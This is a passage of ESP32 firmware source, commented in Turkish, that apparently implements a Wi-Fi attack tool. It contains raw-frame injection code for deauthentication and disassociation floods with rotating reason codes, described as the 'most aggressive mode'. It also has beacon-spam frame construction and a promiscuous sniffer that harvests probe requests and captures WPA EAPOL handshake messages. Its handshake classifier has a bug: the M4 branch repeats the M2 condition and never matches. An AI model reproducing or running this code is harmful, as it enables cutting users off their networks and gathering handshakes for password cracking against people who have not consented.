static const uint8_t BROADCAST_MAC[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};

// ─── WiFi raw-TX / promiscuous başlatma yardımcısı ────────
// esp_wifi_80211_tx için doğru başlatma sırası ESP32-S3'te:
//   1. Önce mevcut WiFi'yi tamamen kapat
//   2. WIFI_MODE_STA ile başlat (Arduino WiFi.mode yeterli değil,
//      esp_wifi_set_mode direkt çağrılır)
//   3. esp_wifi_start() — interface'i gerçekten UP yap
//   4. Güç tasarrufunu kapat
//   5. Promiscuous mode aç
// NOT: WiFi.mode(WIFI_STA) Arduino wrapper'ı WIFI_MODE_STA set eder
//      fakat esp_wifi_start() her zaman çağrılmayabilir.
//      Bu fonksiyon esp_wifi API'yi doğrudan kullanır.
static void wifiInitForRawTx() {
    // Önce her şeyi temiz kapat
    esp_wifi_set_promiscuous(false);
    WiFi.disconnect(true);
    WiFi.mode(WIFI_OFF);
    delay(100);

    // Arduino WiFi.mode(WIFI_STA) + başlatma — bu esp_wifi_start() çağırır
    WiFi.mode(WIFI_STA);
    delay(100);

    // Güç tasarrufunu kapat — promiscuous TX için kritik
    esp_wifi_set_ps(WIFI_PS_NONE);

    // Promiscuous mode aç — raw TX için gerekli
    esp_wifi_set_promiscuous(true);
}

// ─── Deauth frame ─────────────────────────────────────────

typedef struct {
    uint8_t fc[2];
    uint8_t dur[2];
    uint8_t addr1[6];
    uint8_t addr2[6];
    uint8_t addr3[6];
    uint8_t seq[2];
    uint8_t reason[2];
} __attribute__((packed)) DeauthFrame;

static uint16_t s_deauthSeq    = 0;
static uint16_t s_disassocSeq  = 0;
static uint8_t  s_reasonIdx    = 0;

// Reason codes: 1=Unspecified, 2=PrevAuth, 3=NotAssoc, 4=Inactivity,
// 7=NoReason, 8=Disassoc, 15=4-WayTimeout, 16=GroupKeyTimeout
static const uint8_t DEAUTH_REASONS[] = {0x01, 0x02, 0x03, 0x04, 0x07, 0x08, 0x0F, 0x10};
static constexpr uint8_t DEAUTH_REASON_CNT = sizeof(DEAUTH_REASONS);

// Deauthentication frame (FC=0xC0) — her iki yönde, dönen reason code
// NOT: Kanal caller tarafından set edilmeli (sendDeauthDisassoc içinde).
// Bu fonksiyon doğrudan çağrılıyorsa kanal önceden set edilmiş olmalı.
static void sendDeauthFrame(const uint8_t* bssid, const uint8_t* dst, uint8_t /*ch*/) {
    DeauthFrame f;
    f.fc[0] = 0xC0; f.fc[1] = 0x00;
    f.dur[0] = 0x00; f.dur[1] = 0x00;
    // Rotating reason code — farklı reason'lar bazı driver'ları daha hızlı koparır
    f.reason[0] = DEAUTH_REASONS[s_reasonIdx % DEAUTH_REASON_CNT];
    f.reason[1] = 0x00;
    s_reasonIdx++;
    f.seq[0] = (s_deauthSeq & 0x0F) << 4;
    f.seq[1] = (s_deauthSeq >> 4) & 0xFF;
    s_deauthSeq++;
    // AP → Client yönü
    memcpy(f.addr1, dst,   6);
    memcpy(f.addr2, bssid, 6);
    memcpy(f.addr3, bssid, 6);
    esp_wifi_80211_tx(WIFI_IF_STA, &f, sizeof(f), false);
    // Client → AP yönü (sequence numarasını da artır)
    f.seq[0] = (s_deauthSeq & 0x0F) << 4;
    f.seq[1] = (s_deauthSeq >> 4) & 0xFF;
    s_deauthSeq++;
    memcpy(f.addr1, bssid, 6);
    memcpy(f.addr2, dst,   6);
    memcpy(f.addr3, bssid, 6);
    esp_wifi_80211_tx(WIFI_IF_STA, &f, sizeof(f), false);
}

// Disassociation frame (FC=0xA0) — bazı cihazlar sadece buna tepki verir
// Reason code'lar deauth ile aynı rotation'ı paylaşır
// NOT: Kanal caller (sendDeauthDisassoc) tarafından önceden set edilir.
static void sendDisassocFrame(const uint8_t* bssid, const uint8_t* dst, uint8_t /*ch*/) {
    DeauthFrame f;                         // aynı yapı, sadece FC farklı
    f.fc[0] = 0xA0; f.fc[1] = 0x00;      // 0xA0 = Disassociation
    f.dur[0] = 0x00; f.dur[1] = 0x00;
    f.reason[0] = DEAUTH_REASONS[s_reasonIdx % DEAUTH_REASON_CNT];
    f.reason[1] = 0x00;
    s_reasonIdx++;
    f.seq[0] = (s_disassocSeq & 0x0F) << 4;
    f.seq[1] = (s_disassocSeq >> 4) & 0xFF;
    s_disassocSeq++;
    // AP → Client yönü
    memcpy(f.addr1, dst,   6);
    memcpy(f.addr2, bssid, 6);
    memcpy(f.addr3, bssid, 6);
    esp_wifi_80211_tx(WIFI_IF_STA, &f, sizeof(f), false);
    // Client → AP yönü
    f.seq[0] = (s_disassocSeq & 0x0F) << 4;
    f.seq[1] = (s_disassocSeq >> 4) & 0xFF;
    s_disassocSeq++;
    memcpy(f.addr1, bssid, 6);
    memcpy(f.addr2, dst,   6);
    memcpy(f.addr3, bssid, 6);
    esp_wifi_80211_tx(WIFI_IF_STA, &f, sizeof(f), false);
}

// Kombinasyon gönderici: Deauth + Disassoc birlikte — en agresif mod
// Kanal burada TEK SEFER set edilir; alt fonksiyonlar tekrar set etmez.
static void sendDeauthDisassoc(const uint8_t* bssid, const uint8_t* dst, uint8_t ch) {
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    sendDeauthFrame(bssid, dst, ch);
    sendDisassocFrame(bssid, dst, ch);
}

// ─── Beacon frame ─────────────────────────────────────────

static uint16_t s_beaconSeq = 0;

static void sendBeaconFrame(const String& ssid, uint8_t ch, const uint8_t* src, bool hidden = false) {
    uint8_t ssidLen = min((int)ssid.length(), 32);
    static constexpr uint8_t FIXED_PARAMS = 12;
    uint8_t ssidTagLen = hidden ? 2 : (2 + ssidLen);
    uint8_t frameLen = 24 + FIXED_PARAMS + ssidTagLen + 3 + 3 + 4;
    uint8_t* f = (uint8_t*)malloc(frameLen);
    if (!f) return;
    memset(f, 0, frameLen);

    // MAC header
    f[0] = 0x80; f[1] = 0x00;
    memcpy(f + 4, BROADCAST_MAC, 6);
    memcpy(f + 10, src, 6);
    memcpy(f + 16, src, 6);
    f[22] = (s_beaconSeq & 0x0F) << 4;
    f[23] = (s_beaconSeq >> 4) & 0xFF;
    s_beaconSeq++;

    // Fixed params
    uint8_t* body = f + 24;
    uint64_t ts = esp_timer_get_time();
    memcpy(body, &ts, 8);
    body[8] = 0x64; body[9] = 0x00;
    body[10] = 0x31; body[11] = 0x04;

    // SSID tag (tag 0, hide if hidden)
    uint8_t* tag = body + FIXED_PARAMS;
    tag[0] = 0x00;
    if (hidden) {
        tag[1] = 0;
    } else {
        tag[1] = ssidLen;
        memcpy(tag + 2, ssid.c_str(), ssidLen);
    }
    tag += 2 + (hidden ? 0 : ssidLen);

    // Supported rates
    tag[0] = 0x01; tag[1] = 0x01; tag[2] = 0x82;
    tag += 3;

    // DS params
    tag[0] = 0x03; tag[1] = 0x01; tag[2] = ch;

    // NOT: Kanal caller tarafından set edilmeli (jammer/beacon_spam döngüsünde)
    esp_wifi_80211_tx(WIFI_IF_STA, f, frameLen, false);
    free(f);
}

// ─── Probe sniffer ────────────────────────────────────────

struct ProbeEntry {
    String mac;
    String ssid;
    int8_t rssi;
    uint32_t count;
};

static std::vector<ProbeEntry> g_probeList;
static uint32_t g_sniffPkts = 0;
static uint32_t g_sniffBeacon = 0;
static uint32_t g_sniffProbe = 0;
static uint32_t g_sniffData = 0;
static uint32_t g_sniffMgmt = 0;
static uint32_t g_sniffCtrl = 0;

// ─── EAPOL / WPA Handshake state (forward-declared here so
//     promiscCallback below can reference them; full struct
//     definition follows after the callback) ────────────────
struct EAPOLEntry {
    String  apMac;
    String  clientMac;
    String  ssid;
    uint8_t type;   // 1=M1,2=M2,3=M3,4=M4
    uint32_t ts;
};
static std::vector<EAPOLEntry> g_eapolList;
static uint32_t g_eapolTotal = 0;
// ─────────────────────────────────────────────────────────

static void promiscCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    if (!pkt || pkt->rx_ctrl.sig_len < 24) return;
    uint8_t* payload = pkt->payload;
    uint8_t  fc0     = payload[0];
    uint8_t  ftype   = (fc0 >> 2) & 0x03;
    uint8_t  fsub    = (fc0 >> 4) & 0x0F;
    g_sniffPkts++;

    if (ftype == 0) {
        g_sniffMgmt++;
        if (fsub == 8)  g_sniffBeacon++;
        if (fsub == 4) {
            // Probe request
            g_sniffProbe++;
            if (g_probeList.size() >= PROBE_SSID_MAX) return;
            char mac[18];
            snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
                     payload[10], payload[11], payload[12],
                     payload[13], payload[14], payload[15]);
            if (pkt->rx_ctrl.sig_len < 26) return;
            uint8_t  ssidLen = payload[25];
            String   ssid    = "";
            if (ssidLen > 0 && ssidLen < 33 && pkt->rx_ctrl.sig_len >= 26 + ssidLen) {
                for (uint8_t i = 0; i < ssidLen; i++)
                    ssid += (char)payload[26 + i];
            }
            for (auto& e : g_probeList) {
                if (e.mac == mac && e.ssid == ssid) { e.count++; return; }
            }
            g_probeList.push_back({mac, ssid, (int8_t)pkt->rx_ctrl.rssi, 1});
        }
    } else if (ftype == 1) {
        g_sniffCtrl++;
    } else if (ftype == 2) {
        g_sniffData++;
        // ── EAPOL / WPA Handshake detection ──────────────
        // Data frames: check for LLC + SNAP + EAPOL (0x888E)
        // Minimal data frame = 24 byte hdr + 8 byte QoS/data
        if (pkt->rx_ctrl.sig_len < 36) return;
        // QoS data: fc[0]=0x88, skip 2 bytes QoS control → body at offset 26+2=28
        uint8_t off = ((fc0 & 0x80) ? 26 : 24); // QoS bit in fc0 b7
        if (off + 8 > pkt->rx_ctrl.sig_len) return;
        // LLC header: AA AA 03 00 00 00
        if (payload[off]   != 0xAA) return;
        if (payload[off+1] != 0xAA) return;
        if (payload[off+2] != 0x03) return;
        // EtherType at off+6,7
        if (payload[off+6] != 0x88 || payload[off+7] != 0x8E) return;
        // EAPOL!
        g_eapolTotal++;
        if (g_eapolList.size() >= 64) return;
        char apMac[18], clMac[18];
        // addr1=dst addr2=src addr3=BSSID (offsets 4,10,16)
        snprintf(apMac, sizeof(apMac), "%02X:%02X:%02X:%02X:%02X:%02X",
                 payload[16],payload[17],payload[18],payload[19],payload[20],payload[21]);
        snprintf(clMac, sizeof(clMac), "%02X:%02X:%02X:%02X:%02X:%02X",
                 payload[10],payload[11],payload[12],payload[13],payload[14],payload[15]);
        // EAPOL key info at off+9 (key descriptor type), off+10+11 (key info)
        uint8_t keyInfo = (off+10 < pkt->rx_ctrl.sig_len) ? payload[off+9] : 0;
        uint8_t msgType = 0;
        // Simple M1/M2/M3/M4 heuristic based on key_info ACK/MIC bits
        if (off+11 < pkt->rx_ctrl.sig_len) {
            uint16_t ki = ((uint16_t)payload[off+9] << 8) | payload[off+10];
            bool ack = (ki >> 7) & 1;
            bool mic = (ki >> 8) & 1;
            bool ins = (ki >> 6) & 1;
            if (ack && !mic) msgType = 1;          // M1: ACK set, MIC clear
            else if (!ack && mic && !ins) msgType = 2; // M2
            else if (ack && mic && ins) msgType = 3;   // M3
            else if (!ack && mic && !ins) msgType = 4;  // M4
        }
        // Match with known AP SSIDs
        String ssid = "";
        for (auto& ap : g_scanResults)
            if (ap.bssid == apMac) { ssid = ap.ssid; break; }
        // Deduplicate by AP mac
        for (auto& e : g_eapolList)
            if (e.apMac == apMac && e.type == msgType) return;
        g_eapolList.push_back({apMac, clMac, ssid, msgType, millis()});
        logPush("[EAPOL] M" + String(msgType) + " AP=" + String(apMac));
    }
}

